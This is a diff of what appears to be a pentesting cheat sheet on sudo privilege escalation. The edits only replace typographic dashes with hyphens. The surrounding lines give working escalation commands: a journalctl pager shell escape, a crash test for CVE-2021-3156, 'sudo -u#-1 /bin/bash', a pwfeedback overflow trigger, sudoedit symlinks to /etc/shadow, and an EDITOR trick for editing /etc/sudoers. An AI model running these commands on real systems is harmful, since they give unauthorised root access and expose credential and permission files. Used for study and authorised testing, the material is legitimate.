@@ -133,7 +133,7 @@ sudo /bin/systemctl enable /tmp/shell.service
 ```bash
 sudo journalctl
 !/bin/bash
-# (works when output is paged — use small terminal)
+# (works when output is paged - use small terminal)
 ```
 
 ### apache2
@@ -207,9 +207,9 @@ sudo LD_LIBRARY_PATH=/tmp /path/to/allowed_binary
 
 ## 5. Sudo CVEs
 
-### CVE-2021-3156 — Baron Samedit
+### CVE-2021-3156 - Baron Samedit
 ```bash
-# sudo 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1
+# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
 sudo --version
 
 # Test (segfault = vulnerable)
@@ -218,7 +218,7 @@ sudoedit -s '\' $(python3 -c 'print("A"*65536)')
 # Exploit: https://github.com/blasty/CVE-2021-3156
 ```
 
-### CVE-2019-14287 — sudo -u#-1
+### CVE-2019-14287 - sudo -u#-1
 ```bash
 # sudo < 1.8.28
 # If sudoers says: user ALL=(ALL, !root) /bin/bash
@@ -226,9 +226,9 @@ sudo -u#-1 /bin/bash
 # UID -1 overflows to 0 (root)
 ```
 
-### CVE-2019-18634 — sudo pwfeedback buffer overflow
+### CVE-2019-18634 - sudo pwfeedback buffer overflow
 ```bash
-# sudo 1.7.1 – 1.8.25p1 with pwfeedback enabled
+# sudo 1.7.1 - 1.8.25p1 with pwfeedback enabled
 # Check: Defaults pwfeedback in /etc/sudoers
 perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id 2>/dev/null
 # Segfault = vulnerable
@@ -247,7 +247,7 @@ ln -s /etc/shadow /path/to/file
 sudoedit /path/to/file  # Edits /etc/shadow as root
 
 # CVE-2023-22809: sudoedit arbitrary file edit
-# sudo 1.8.0 – 1.9.12p1
+# sudo 1.8.0 - 1.9.12p1
 # Use EDITOR with -- to escape allowed paths
 EDITOR="vim -- /etc/sudoers" sudoedit /allowed/file
 ```
